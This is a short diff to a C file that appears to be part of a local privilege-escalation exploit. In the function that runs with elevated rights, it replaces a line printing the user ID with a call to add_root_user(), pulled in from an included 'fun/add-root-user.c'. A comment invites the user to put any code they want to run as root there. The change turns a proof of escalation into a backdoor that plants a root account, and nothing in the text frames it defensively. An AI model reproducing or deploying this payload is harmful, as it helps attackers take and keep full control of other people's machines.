@@ -1,5 +1,6 @@
 #include "tas/tas.h"
 #include "tas/constructor.c"
+#include "fun/add-root-user.c"
 
 #include <stdio.h>
 #include <string.h>
@@ -23,9 +24,11 @@ end:
 	return 1;
 }
 
+// edit this function to run
+// what you want as root
 void super(void)
 {
-	printf("UID = %d\n", getuid());
+	add_root_user();
 }
 
 void prepare(void)
